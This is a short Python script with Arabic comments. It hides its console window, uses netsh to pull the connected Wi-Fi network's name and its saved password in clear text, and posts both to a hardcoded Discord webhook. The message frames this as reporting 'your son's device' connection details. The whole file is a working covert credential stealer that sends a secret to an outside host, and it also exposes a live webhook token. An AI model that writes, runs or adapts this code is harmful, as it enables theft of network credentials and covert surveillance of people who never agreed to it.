import subprocess
import requests
import json
import os

# رابط الـ Webhook الخاص بك
webhook_url = "https://discord.com/api/webhooks/1452755782377406586/_G5h9Irx3g3Uw7YgVCmvWVBSh0ctHx-cR_e1hbTrJk7p_TTqP4VwlHeeThuoaMhzdsta"

def get_wifi_details():
    try:
        # إعدادات إخفاء نافذة الـ CMD
        info = subprocess.STARTUPINFO()
        info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        info.wShowWindow = 0 
        
        # 1. الحصول على اسم الشبكة الحالية (SSID)
        interface_data = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'], startupinfo=info).decode('utf-8', errors="ignore")
        wifi_name = "Unknown"
        for line in interface_data.split('\n'):
            if "SSID" in line and "BSSID" not in line:
                wifi_name = line.split(":")[1].strip()
                break
        
        # 2. الحصول على كلمة المرور للشبكة المتصل بها
        wifi_password = "Not Found"
        if wifi_name != "Unknown":
            profile_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi_name, 'key=clear'], startupinfo=info).decode('utf-8', errors="ignore")
            for line in profile_data.split('\n'):
                if "Key Content" in line:
                    wifi_password = line.split(":")[1].strip()
                    break
        
        return wifi_name, wifi_password
    except:
        return "Error", "Error"

# تنفيذ الجلب
name, password = get_wifi_details()

# إعداد الرسالة لـ Discord
payload = {
    "content": f"📡 **بيانات اتصال جهاز ابنك:**\n"
               f"**الشبكة:** {name}\n"
               f"**كلمة المرور:** `{password}`"
}

# الإرسال
requests.post(webhook_url, data=json.dumps(payload), headers={'Content-Type': 'application/json'})
